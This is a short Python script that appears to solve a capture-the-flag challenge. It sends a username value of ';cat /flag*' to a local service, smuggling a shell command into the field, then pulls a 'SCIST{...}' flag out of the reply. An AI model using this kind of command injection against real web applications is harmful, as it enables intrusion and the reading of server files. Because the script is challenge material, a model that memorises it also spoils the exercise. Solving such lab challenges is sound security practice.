#!/usr/bin/env python3
from subprocess import check_output
from urllib.parse import quote
from base64 import b64encode
from os import getenv
import requests, re

HOST = getenv('HOST') or 'localhost'
url = f'http://{HOST}:10001'

cmd = 'cat /flag*'

s = requests.Session()
res = s.post(url, data={ 'username': f";{cmd}" })
res = s.post(url, data={ 'username': f";{cmd}" })
flag = re.findall('SCIST{.+}', res.text)[0]
print(flag)
